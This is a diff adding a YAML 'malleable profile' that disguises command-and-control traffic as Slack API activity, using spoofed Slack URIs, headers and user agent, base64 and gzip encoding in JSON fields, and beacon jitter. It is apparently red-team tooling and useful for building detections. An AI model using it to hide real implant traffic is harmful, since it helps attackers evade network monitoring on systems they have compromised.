@@ -1,0 +1,82 @@
+# Slack Malleable Profile
+# Disguises C2 traffic as Slack API activity
+
+name: "slack"
+description: "Slack workspace and messaging traffic disguise"
+
+http_get:
+  uri:
+    - "/api/conversations.history"
+    - "/api/conversations.info"
+    - "/api/users.info"
+  verb: "GET"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Accept-Encoding: "gzip, deflate, br"
+      Authorization: "Bearer xoxb-{token}"
+      Connection: "keep-alive"
+      Host: "slack.com"
+      User-Agent: "Slack-Web-Client/4.35.126"
+      Content-Type: "application/json; charset=utf-8"
+    metadata:
+      encoding:
+        - base64
+      location: "uri"
+      parameter: "cursor"
+
+  server:
+    headers:
+      Access-Control-Allow-Origin: "*"
+      Cache-Control: "private, no-cache, no-store, must-revalidate"
+      Content-Type: "application/json; charset=utf-8"
+      Referrer-Policy: "no-referrer"
+      Server: "Apache"
+      Strict-Transport-Security: "max-age=31536000; includeSubDomains; preload"
+      X-Content-Type-Options: "nosniff"
+      X-Slack-Backend: "r"
+    output:
+      encoding:
+        - base64
+      container: "json"
+      path: "messages[0].text"
+
+http_post:
+  uri:
+    - "/api/chat.postMessage"
+    - "/api/files.upload"
+  verb: "POST"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Authorization: "Bearer xoxb-{token}"
+      Content-Type: "application/json"
+    id:
+      encoding:
+        - base64
+      location: "uri"
+      parameter: "channel"
+    output:
+      encoding:
+        - gzip
+        - base64
+      location: "body"
+      container: "json"
+      path: "text"
+
+  server:
+    headers:
+      Content-Type: "application/json"
+      Server: "Apache"
+    output:
+      encoding:
+        - base64
+      container: "json"
+      path: "ts"
+
+jitter:
+  min: 30
+  max: 60
+  percent: 20
